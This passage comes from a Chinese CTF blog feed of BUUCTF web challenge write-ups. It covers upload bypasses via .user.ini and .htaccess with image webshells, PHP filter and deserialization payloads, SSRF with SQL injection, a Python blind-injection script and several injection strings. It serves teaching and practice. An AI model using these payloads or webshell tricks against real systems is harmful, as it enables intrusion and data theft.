style="color:red">题目考点 .user.ini动态配置文件的使用，exif_imagetype()函数的绕过</span></p><p>查看源码后发现该题使用的是exif_imagetype()函数检测文件类型，exif_imagetype()是通过检查文件头来检测上传文件的类型，所以我们通过过伪造文件头的方式制作图片马，在前面加上GIF98a，成功上传。</p><p>上传成功后回显</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-23-1024x354.png" class><p>返回我们的文件上传到了uploads/巴拉巴拉巴拉这个目录下，我们发现这个目录下有个index.php ？？？？ 为什么这里会出现index.PHP? 联想到图片马需要文件包含漏洞才可以被执行，那么肯定需要某种办法让index.php包含这个图片马或者让php自动包含这个图片马。怎样才能做到呢？这里就需要引入新的一个知识点</p><p>.user.ini配置文件，这个是一个动态配置文件，访问时生效。而这个配置文件中可以添加一条属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;php.jpg</span><br></pre></td></tr></table></figure><p>表明我们运行此文件夹下的php文件时会自动包含php.jpg，这不就可以触发我们的图片马了吗，上传 链接，访问index.php</p><p> getflag！</p><h2 id="ZJCTF-2019-NiZhuanSiWei1"><a href="#ZJCTF-2019-NiZhuanSiWei1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei1"></a>[ZJCTF 2019]NiZhuanSiWei1</h2><p><span style="color:red">本题考点。data://伪协议，php://filter伪协议，php反序列化</span></p><p>打开题目是经典的给源码题</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-26-1024x515.png" class><p>分析一下逻辑吧，三个参数text,file,password。首先进行判断test内容是否为指定文本，然后检测file中是否含有flag字符串，然后包含文件file，这里注释告诉我们需要包含useless.php。最后将password进行反序列化后输出。</p><p>看到这里，将一个反序列化对象进行输出，我们就可以猜测到useless.php肯定是修改了__Tostring魔术方法。</p><p>看到file_get_contens，include之类的函数，首先就想到php伪协议这里需要进行判断文件内容，那我们使用data://绕过第一个判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?test&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome the zjctf</span><br></pre></td></tr></table></figure><p>然后我们通过文件包含漏洞通过php:filter读取useless.php的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:&#123;s:4:”file”;s:8:”flag.php”;&#125;</span><br></pre></td></tr></table></figure><p>把源码通过base64输出后解码发现</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-27-1024x577.png" class><p>php反序列化，本地反序列化</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-28.png" class><p>反序列化结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:”Flag”:1:&#123;s:4:”file”;s:8:”flag.php”;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：http:&#x2F;&#x2F;43116097-03b5-4007-aa37-e2aed848730d.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:&#123;s:4:”file”;s:8:”flag.php”;&#125;</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2018-Fakebook1"><a href="#网鼎杯-2018-Fakebook1" class="headerlink" title="[网鼎杯 2018]Fakebook1"></a>[网鼎杯 2018]Fakebook1</h2><p><span style="color:red">本题考点。本题考点：SSRF，SQL注入，sql反序列化。</span></p><p>进入题目环境，进行信息收集。首先访问robots.txt</p><p>源码泄露，打开源码后如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output &#x3D; curl_exec($ch);</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码审计后发现get()函数使用了curl函数，可能存在ssrf攻击。</p><p>curl函数，是通过服务器获取目标url地址内容的一种方法，这里是通过服务器访问，正好满足ssrf的条件，利用这里的漏洞就可以构造get函数的url，达到访问服务器内部资源的目的。</p><p>但是这里面的isValidBlog函数进行了过滤，导致我们无法构造类似于file:///var/www/html/xxx之类的payload。至此，源码分析结束。</p><p>打开网站，查看了login,join，主页面的源码后没有发现什么有用的信息。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-31-1024x233.png" class><p>进入join，添加信息</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-32-1024x178.png" class><p>在blog一栏我输的是百度的地址，添加成功后我们点进去看看，可以发现刚刚我们进行源码审计的时候，curl函数发挥了作用，目标url已经成功访问。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-33-1024x385.png" class><p>接下来寻找新的攻击入口，注意到地址栏存在get传参，考虑sql注入，引号出现了报错，存在注入。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-34-1024x116.png" class><p>尝试测试回显</p><p>使用联合查询发现union select 被过滤了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用&#x2F;**&#x2F;或者union all select绕过，这里我使用&#x2F;**&#x2F;绕过</span><br></pre></td></tr></table></figure><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-35-1024x328.png" class><p>回显为2</p><p>接下来爆表爆字段就好，这里不过多讲述。最后发现在users表的data字段保存着一段序列化过后的信息。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-36-1024x327.png" class><p>接着将序列化数据修改后通过sql语句注入，这里的flag.php是扫描到的。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-37-1024x372.png" class><p>注意，这里如果你是直接修改sql注出来的data，记得修改url前面的长度数据，不然会导致报错。注入顺序也要在第4位，至于为什么，猜测可能是4号位的回显对应执行序列化操作。</p><p>注入成功后在源码中发现flag，base64解密即可。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-38-1024x175.png" class><h2 id="CISCN2019-华北赛区-Day2Web1-Hack-World1"><a href="#CISCN2019-华北赛区-Day2Web1-Hack-World1" class="headerlink" title="[CISCN2019 华北赛区 Day2Web1]Hack World1"></a>[CISCN2019 华北赛区 Day2Web1]Hack World1</h2><p><span style="color:red">本题考点：bool盲注。</span></p><p>今天研究了一下午这道题，也是我的第一道bool盲注类型的题目。之前很少有刷sql注入类型的题，有也是非常简单的报错注入，数字型注入，和一些简单的绕过，这次通过这道题对sql注入的理解深刻了那么一丢丢。</p><p>首先拿到题目，告诉我们flag就在flag表当中的flag字段里面，现在回想起来看到这应该就意识到不是一般的报错，字符，数字型注入了。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-39-1024x303.png" class><p>经过我的测试，输入数据1，2都会有回显，输入(union)提示sql注入检测,用我的字典跑一下。发现ascii(substr())没有被过滤，那么直接通过bool盲注脚本即可跑出flag</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-40.png" class><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">def boolblind():</span><br><span class="line">    pd &#x3D; 1</span><br><span class="line">    flag &#x3D; &#39;&#39;</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;eb79ed3f-2f14-4d1c-9c24-20fad4cbe417.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line">    for i in range(1,50):#flag的长度，假设flag长度不超过50</span><br><span class="line">        if pd &#x3D;&#x3D; 1:</span><br><span class="line">            max &#x3D; 127</span><br><span class="line">            min &#x3D; 0</span><br><span class="line">            for c in range(0,127):</span><br><span class="line">                half &#x3D; (int)((max + min) &#x2F; 2)</span><br><span class="line">                payload &#x3D; &#39;1^(ascii(substr((select(flag)from(flag)),&#39;+str(i)+&#39;,1))&#39;+&#39;&gt;&#39;+str(half)+&#39;)&#39;</span><br><span class="line">                r &#x3D; requests.post(url,data&#x3D;&#123;&#39;id&#39;:payload&#125;)</span><br><span class="line">                time.sleep(0.001)</span><br><span class="line">                if &#39;Hello, glzjin wants a girlfriend.&#39; in str(r.content):</span><br><span class="line">                    max &#x3D; half</span><br><span class="line">                else:</span><br><span class="line">                    min &#x3D; half</span><br><span class="line">                if ((max - min) &lt;&#x3D; 1):</span><br><span class="line">                    if max !&#x3D; 1:</span><br><span class="line">                        flag &#x3D; flag + chr(max)</span><br><span class="line">                    else:</span><br><span class="line">                        pd &#x3D; 0</span><br><span class="line">                        break</span><br><span class="line">                    print(flag)</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    boolblind()</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-HardSQL1"><a href="#极客大挑战-2019-HardSQL1" class="headerlink" title="[极客大挑战 2019]HardSQL1"></a>[极客大挑战 2019]HardSQL1</h2><p><span style="color:red">考点：sql报错注入，空格绕过</span></p><p>fuzz后发现过滤了空格，union等字符串，尝试/**/绕过空格失败，尝试堆叠注入失败，想到了报错注入updatexml()</p><p>没什么好讲的了，构造payload，爆库爆表爆字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆库admin’or(updatexml(1,concat(0x7e,database(),0x7e),1))%23</span><br><span class="line">爆表dmin’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23</span><br><span class="line">爆字段admin’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’)),0x7e),1))%23</span><br></pre></td></tr></table></figure><p>这里值得注意的是爆字段只出来了一般的flag，需要用到right()函数输出flag后半部分字段，拼接获得flag！</p><h2 id="GXYCTF2019-BabySQli1"><a href="#GXYCTF2019-BabySQli1" class="headerlink" title="[GXYCTF2019]BabySQli1"></a>[GXYCTF2019]BabySQli1</h2><p><span style="color:red">考点：username，password分别验证，联合查询不存在数据会自动创造。</span></p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-43-1024x348.png" class><p>admin登录显示密码错误，证明有admin这个用户存在。</p><p>联合查询发现有3个字段</p><p>这个题有一行base32加密，解密后是一段base64，在解密后变成了一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure><p>通过wp了解到，这个题是先查询username查到user后在查询user对应的md5密码，将对应的md5密码和传入的pw参数md5加密后进行比对</p><p>我构造</p><p>name=1′ union select 1,’admin’,3&amp;pw=123</p><p>不会报错，sql首先查询name为1的字段，没有查找到，但是返回了select的数据，经测试只有第二个字段数据为admin的时候才不会报错，那么可以判断2号字段对应用户名字段，猜测3号为密码md5字段。</p><p>这里有一个特性，在执行联合查询的时候，如果联合查询前面的数据不存在，那么就会往数据库插入对应字段的数据。</p><p>比如说 我构造的payload</p><p>name=1′ union select 1,’admin’,3&amp;pw=123</p><p>1查询不存在，union select会往对应的user字段插入admin，password字段插入3</p><p>那么现在我只需要在3号字段传入123的md5，并且用户名为admin，那么就可以使用admin/123进行登陆了</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-44-1024x350.png" class><p>get flag！</p><h2 id="网鼎杯-2020-青龙组-AreUSerialz1"><a href="#网鼎杯-2020-青龙组-AreUSerialz1" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz1"></a>[网鼎杯 2020 青龙组]AreUSerialz1</h2><p><span style="color:red">考点：php反序列化，弱相等。</span></p><p>拿到这道题目直接高亮了源代码，我们进行一波审计</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op &#x3D; &quot;1&quot;;</span><br><span class="line">        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;</span><br><span class="line">        $content &#x3D; &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">            $res &#x3D; $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res &#x3D; &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res &#x3D; file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br><span class="line">        $this-&gt;content &#x3D; &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str &#x3D; (string)$_GET[&#39;str&#39;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj &#x3D; unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显需要我们传入序列化对象给str变量，我们传入的序列化字符串经过is_valid函数后便会被实例化，当他被销毁时即调用__destruct进入process，首先检测op===’2’注意这里是===全等于，我们在序列化的时候将op=2即可绕过，因为他不是字符串类型。接着绕过isvalid，ascall码要在35到125之间，protect序列化后会出现%00这样的参数，但是在PHP7.1以上对序列化字符串属性检测并不严格，所以直接使用public就可以绕过了,至于flag.php，根据经验我直接访问确实有这个文件，所以就知道了。</p><p>构造payload：O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:5:”hello”;}</p><p>get flag!</p><h2 id="GYCTF2020-Blacklist1"><a href="#GYCTF2020-Blacklist1" class="headerlink" title="[GYCTF2020]Blacklist1"></a>[GYCTF2020]Blacklist1</h2><p><span style="color:red">考点，堆叠注入，handler语句</span></p><p>首先堆叠注入查询发现了flag所在的表，题目过滤了很多关键字，但是发现可以堆叠注入，通过查询mysql手册发现hander命令，handler命令可以做到访问表。handler命令语法如下：</p><p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</p><p>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</p><p>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-46-1010x1024.png" class><p>payload：1′;handler FlagHere open;handler FlagHere read first%23</p><p>get flag！</p><h2 id="RoarCTF-2019-Easy-Java1"><a href="#RoarCTF-2019-Easy-Java1" class="headerlink" title="[RoarCTF 2019]Easy Java1"></a>[RoarCTF 2019]Easy Java1</h2><p><span style="color:red">考点：Javaweb中的WEB-INF目录下的泄露</span></p><p>打开题目，随便试了下弱口令登录，无果。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-1024x765.png" class><p>点击help，发现filename后面跟的文件名，而并不会打开这个文件而是把文件名显示出来了</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-1-1024x91.png" class><p>抓包，尝试更换请求方式，请求成功并且得到了数据，证明通过post方法可以进行文件访问。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-2-1024x288.png" class><p>在JAVAWEB中，WEB-INF路径是web应用的安全目录，客户端无法访问，只有服务端才能够访问。这里面的常见文件类型如下</p><p>/WEB-INF/web.xml Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p><p>/WEB-INF/classes/ 包含了站点所有用的 <strong>class</strong> 文件，包括 <strong>servlet</strong> <strong>class</strong> 和非<strong>servlet</strong> <strong>class</strong>，他们不能包含在 .<strong>jar</strong>文件中。</p><p>/WEB-INF/lib/ 存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。</p><p>/WEB-INF/src/ 源码目录，按照包名结构放置各个Java文件。</p><p>/WEB-INF/database.properties 数据库配置文件</p><p>/WEB-INF/tags/ 存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名，当使用自定义的标签文件库名称时，在使用标签文件时就必须声明正确的标签文件库路径。例如：当自定义标签文件库名称为 simpleTags 时，在使用 simpleTags 目录下的标签文件时，就必须在 jsp 文件头声明为：&lt;%@ taglibprefix=”tags” tagdir=”/WEB-INF /simpleTags” % &gt;。</p><p>/WEB-INF/jsp/ jsp 1.2 以下版本的文件存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition 。</p><p>/WEB-INF/jsp2/ 与 jsp 文件目录相比，该目录下主要存放 Jsp 2.0 以下版本的文件，当然，它也是可以任意命名的，同样为区别 Jsp 1.2以下版本的文件目录，通常才命名为 jsp2。</p><p>META-INF 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务manifest.mf文件，在用jar打包时自动生成。</p><p>转载至<a href="https://www.anquanke.com/post/id/205215#h2-0">https://www.anquanke.com/post/id/205215#h2-0</a></p><p>我们访问WEB-INF/web.xml看一下web应用配置规则</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-3.png" class><p>注意servlet-class标签，该标签内容为com.wm.ctf.FlagController</p><p>这个标签记录了<code>/WEB-INF/classes/</code>的类，也就是说，这个标签对应的内容是在/WEB-INF/classes/中的，那么这里对应的flag就在</p><p>WEB-INF/classes/con/wm/ctf/FlagController.class（注意，文件后缀加上.class）</p><p>访问，发现一段base64，解密后获得flag</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-4.png" class><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;32d00317-9ae9-4aec-8fec-5fd179076b72&#125;</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p><span style="color:red">考点: .htaccess配置文件，图片马</span></p><p>尝试上传图片，给出路径</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-5-1024x192.png" class><p>尝试phtml，php等后缀的文件上传被拦截</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-6-1024x174.png" class><p>图片马需要将图片作为php解析，可以使用文件包含或者配置文件更改解析规则。这里没有文件包含，但是可以上传配置文件。</p><p>我们上传.htaccess内容为</p><p>AddType application/x-httpd-php .jpg</p><p>将所有.jpg文件当成php代码解析</p><p>上传.htaccess文件将</p><p>Content-Type: application/octet-stream改为Content-Type: image/jpg</p><p>蚁剑链接Getflag！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;护网杯-2018-WEB-easy-tornado-1&quot;&gt;&lt;a href=&quot;#护网杯-2018-WEB-easy-tornado-1&quot; class=&quot;headerlink&quot; title=&quot;护网杯 2018-WEB-easy_tornado 1&quot;&gt;&lt;/a&gt;护网杯 2</summary>
      
    
    
    
    
    <category term="BUUCTF" scheme="http://example.com/tags/BUUCTF/"/>
    
    <category term="CTF复现" scheme="http://example.com/tags/CTF%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>pwn入门体验</title>
    <link href="http://example.com/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/"/>
    <id>http://example.com/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/</id>
    <published>2020-12-17T14:42:38.000Z</published>
    <updated>2021-02-04T15:08:53.135Z</updated>
    
